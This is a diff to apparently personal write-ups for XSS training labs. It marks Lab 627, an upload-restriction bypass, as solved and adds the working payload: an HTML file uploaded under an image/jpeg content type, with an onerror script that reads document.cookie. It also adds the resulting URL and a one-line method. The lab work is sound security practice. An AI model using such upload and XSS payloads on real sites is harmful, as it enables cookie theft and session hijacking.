@@ -721,10 +721,19 @@ https://xboa2upw.xssy.uk/target.ftl?base=https://eqh42jmm.xssy.uk/app.js&name=di
 ---
 
 ### Lab 627: Upload Restriction Bypass
-- **URL Lab**: https://xssy.uk/lab/627
-- **Status**: Not solved yet
-- **Description**: Tried change filename, modified filetype, content-type but nothing worked
+- **URL Lab**: https://hacky.uk/lab/627
+- **Payload**: 
+```javascript
+filename="photo.html"
+Content-Type: image/jpeg
 
+<img src=x onerror=alert(document.cookie)>
+```
+- **Full URL**: 
+```
+https://qanxukb3.hacky.uk/upload/photo.html
+```
+- **Description**: change the filename extension to .html and then, inject the body with xss payload
 ---
 
 ### Lab 637: Sniffing Danger
